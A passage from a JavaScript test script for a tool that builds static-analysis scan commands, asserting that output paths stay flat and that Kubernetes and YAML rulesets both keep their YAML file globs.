    outputs.every((p) => /^\/out\/run_1\/raw\/[^/]+$/.test(p)),
    `a slash in a language key must not become a directory in the output path, got ${outputs.join(',')}`,
  )
}

// Equal sets are not subsets of each other. A Kubernetes manifest is a YAML file and no
// extension separates them, so emptying either would send its rulesets across the target.
{
  const { calls } = await run({
    ...BASE,
    rulesets: { baseline: [], kubernetes: ['p/kubernetes'], yaml: ['p/yaml'], third_party: [] },
  })
  const cmds = commandsIn(calls)
  ok(
    cmds.length === 2 &&
      cmds.every((x) => x.includes('--include="*.yaml"') && x.includes('--include="*.yml"')),
    'two languages with identical globs must both keep them',
  )
}

if (failures > 0) {
  console.error(`${failures} assertion(s) failed`)
  process.exit(1)
}
if (ran !== EXPECTED_ASSERTIONS) {
  console.error(`ran ${ran} assertions, expected ${EXPECTED_ASSERTIONS}, so the suite did not run in full`)
  process.exit(1)
}
console.log(`${ran} assertions passed`)
